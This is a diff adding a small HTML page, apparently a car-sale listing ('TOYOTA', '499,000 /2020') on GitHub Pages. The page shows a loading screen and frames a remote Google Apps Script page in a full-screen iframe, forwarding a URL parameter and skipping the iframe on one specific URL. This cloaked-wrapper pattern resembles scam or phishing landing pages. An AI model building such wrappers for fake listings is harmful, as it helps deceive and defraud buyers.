@@ -1,0 +1,54 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta name="google-site-verification" content="-LkgtHlPhP3dcs_a59xVUtoiAAmulU3h-9a_ADQ60QE" />
+  <meta charset="UTF-8">
+  <title>TOYOTA</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content=" 499,000 /2020 ">
+  <link rel="icon" href="https://lh5.googleusercontent.com/d/1IrwFLVpK2mth31sf_XhGIeS6Mm5xbt-B">
+  <meta property="og:image" content="https://lh5.googleusercontent.com/d/108eBe5dHTSQLkTWfI2uAj41BgWvpKeDa">
+  <meta property="og:url" content="https://creecar.github.io/Krungthep">
+  <link rel="canonical" href="https://creecar.github.io/Krungthep">
+
+  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+  <meta http-equiv="Pragma" content="no-cache">
+  <meta http-equiv="Expires" content="0">
+
+  <style>
+    html, body { margin: 0; padding: 0; height: 100%; }
+    #loading { position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+      background: rgba(255, 255, 255, 0.8); display: flex; align-items: center;
+      justify-content: center; font-size: 18px; font-weight: bold; color: #2d7cff; }
+    #myFrame { position: absolute; top: 0; left: 0; width: 100%; height: 100%; border: 0; display: none; }
+  </style>
+</head>
+<body>
+  <div id="loading">Loading platform...</div>
+  <iframe id="myFrame" src=""></iframe>
+  
+  <script>
+    (function() {
+      let link = window.location.href;
+      let linkParts = link.split("?");
+      let params = linkParts.length > 1 ? linkParts[1].split("&")[0] : "";
+      let cacheBust = new Date().getTime();
+      let link3 = "https://script.google.com/macros/s/AKfycbx6FZCUPRZxhbyWSLuDCCBQkWS0i9KF3H6Juv3iGxOeL1dBWjNsYbpp_l5VQ9LvmFzM/exec?seree=" + params + "&cb=" + cacheBust;
+
+      let iframe = document.querySelector("#myFrame");
+      let loadingDiv = document.querySelector("#loading");
+
+      iframe.onload = function() {
+          loadingDiv.style.display = "none";
+          iframe.style.display = "block";
+      };
+
+      if (!link.includes("sereecar.github.io/index.html")) {
+          iframe.setAttribute("src", link3);
+      }
+    })();
+  </script>
+
+</body>
+</html>
